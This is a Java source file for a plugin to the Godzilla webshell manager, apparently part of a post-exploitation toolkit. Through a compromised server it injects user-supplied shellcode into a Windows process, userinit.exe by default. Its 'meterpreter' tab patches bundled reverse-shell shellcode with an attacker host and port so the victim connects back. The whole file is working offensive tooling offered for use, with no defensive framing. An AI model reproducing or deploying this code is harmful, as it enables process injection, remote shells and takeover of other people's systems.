package net.BeichenDream.Godzilla.shells.plugins.java;

import net.BeichenDream.Godzilla.core.Encoding;
import net.BeichenDream.Godzilla.core.annotation.PluginAnnotation;
import net.BeichenDream.Godzilla.core.imp.Payload;
import net.BeichenDream.Godzilla.core.imp.Plugin;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import net.BeichenDream.Godzilla.core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.border.TitledBorder;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.automaticBindClick;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.ReqParameter;

@PluginAnnotation(
    payloadName = "JavaDynamicPayload",
    Name = "AttachShellcodeLoader"
)

public class AttachShellcodeLoader implements Plugin {
    private static final String CLASS_NAME = "AttachShellcodeLoader";
    private Encoding encoding;
    private final JLabel excuteFileLabel = new JLabel("注入进程文件: ");
    private final JTextField excuteFileTextField = new JTextField("C:/Windows/System32/userinit.exe", 50);
    private final JButton goButton = new JButton("Go");
    private final JLabel hostLabel = new JLabel("host :");
    private final JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private final JCheckBox is64CheckBox = new JCheckBox("is64", true);
    private JarLoader jarLoader;
    private final JButton loadButton = new JButton("Load");
    private boolean loadState;
    private final JPanel meterpreterPanel = new JPanel(new BorderLayout());
    private final JSplitPane meterpreterSplitPane = new JSplitPane();
    private final JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private final JLabel portLabel = new JLabel("port :");
    private final JTextField portTextField = new JTextField("4444", 7);
    private final JButton runButton = new JButton("Run");
    private ShellEntity shellEntity;
    private final JPanel shellcodeLoaderPanel = new JPanel(new BorderLayout());
    private final RTextArea shellcodeTextArea = new RTextArea();
    private final JSplitPane splitPane = new JSplitPane();
    private final JTabbedPane tabbedPane = new JTabbedPane();
    private final RTextArea tipTextArea = new RTextArea();

    public AttachShellcodeLoader() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.excuteFileLabel);
        topPanel.add(this.excuteFileTextField);
        topPanel.add(this.loadButton);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.shellcodeTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            /* class shells.plugins.java.AttachShellcodeLoader.AnonymousClass1 */

            public void componentResized(ComponentEvent e) {
                AttachShellcodeLoader.this.splitPane.setDividerLocation(0.15d);
            }
        });
        this.is64CheckBox.addItemListener(new ItemListener() {
            /* class shells.plugins.java.AttachShellcodeLoader.AnonymousClass2 */

            public void itemStateChanged(ItemEvent e) {
                AttachShellcodeLoader.this.updateMeterpreterTip();
            }
        });
        this.shellcodeTextArea.setAutoscrolls(true);
        this.shellcodeTextArea.setBorder(new TitledBorder("shellcode"));
        this.shellcodeTextArea.setText("");
        this.tipTextArea.setAutoscrolls(true);
        this.tipTextArea.setBorder(new TitledBorder("tip"));
        this.tipTextArea.setText("");
        this.shellcodeLoaderPanel.add(this.splitPane);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.is64CheckBox);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.meterpreterPanel.add(this.meterpreterSplitPane);
        this.tabbedPane.addTab("shellcodeLoader", this.shellcodeLoaderPanel);
        this.tabbedPane.addTab("meterpreter", this.meterpreterPanel);
        updateMeterpreterTip();
        this.panel.add(this.tabbedPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/AttachShellcodeLoader.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                    return;
                }
                JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        String shellcodeHex = this.shellcodeTextArea.getText().trim();
        if (shellcodeHex.length() > 0) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("shellcodeHex", shellcodeHex);
            reqParameter.add("executableFile", this.excuteFileTextField.getText());
            String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", reqParameter));
            Log.log(resultString, new Object[0]);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        try {
            String shellcodeHexString = getMeterpreterShellcodeHex(this.hostTextField.getText().trim(), Integer.parseInt(this.portTextField.getText()), this.is64CheckBox.isSelected());
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("shellcodeHex", shellcodeHexString);
            reqParameter.add("executableFile", this.excuteFileTextField.getText());
            String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", reqParameter));
            Log.log(resultString, new Object[0]);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
        } catch (Exception e) {
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.panel;
    }

    public String getMeterpreterShellcodeHex(String host, int port, boolean is64) {
        Exception e;
        String shellcodeHex = "";
        try {
            Class<?> cls = getClass();
            Object[] objArr = new Object[1];
            objArr[0] = is64 ? "64" : "";
            InputStream inputStream = cls.getResourceAsStream(String.format("assets/reverse%s.bin", objArr));
            String shellcodeHex2 = new String(functions.readInputStream(inputStream));
            try {
                inputStream.close();
                return shellcodeHex2.replace("{host}", functions.byteArrayToHex(functions.ipToByteArray(host))).replace("{port}", functions.byteArrayToHex(functions.shortToByteArray((short) port)));
            } catch (Exception e2) {
                e = e2;
                shellcodeHex = shellcodeHex2;
                Log.error(e);
                return shellcodeHex;
            }
        } catch (Exception e3) {
            e = e3;
            Log.error(e);
            return shellcodeHex;
        }
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private void updateMeterpreterTip() {
        try {
            boolean is64 = this.is64CheckBox.isSelected();
            InputStream inputStream = getClass().getResourceAsStream("assets/meterpreterTip2.txt");
            String tipString = new String(functions.readInputStream(inputStream));
            inputStream.close();
            this.tipTextArea.setText(tipString.replace("{arch}", is64 ? "/x64" : ""));
        } catch (Exception e) {
            Log.error(e);
        }
    }
}
